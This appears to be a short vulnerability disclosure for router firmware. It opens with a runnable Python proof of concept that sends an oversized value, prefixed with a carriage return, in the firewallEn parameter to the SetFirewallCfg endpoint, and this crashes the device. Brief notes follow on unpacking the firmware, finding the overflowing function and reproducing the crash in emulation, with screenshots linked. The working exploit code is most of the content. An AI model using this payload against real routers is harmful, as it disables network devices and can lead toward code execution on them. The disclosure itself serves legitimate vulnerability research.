POC：
```
from pwn import *
import requests

payload = b'a'*0x100

url = "http://192.168.100.254/goform/SetFirewallCfg"

cookie = {"Cookie":"password=12345"}
data = {"firewallEn": b"\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
1. The firmware is unpacked, the file system is separated, and the file is analyzed

2. There is a stack overflow vulnerability function

<img width="415" height="258" alt="image" src="https://github.com/user-attachments/assets/6a376fd9-d98e-44ca-aa14-30eb3a921777" />


3. Firmware emulation simulation attack
POC causes router crashes

<img width="415" height="54" alt="image" src="https://github.com/user-attachments/assets/44900b41-c705-4b3c-ac24-6ca618d1f3f3" />
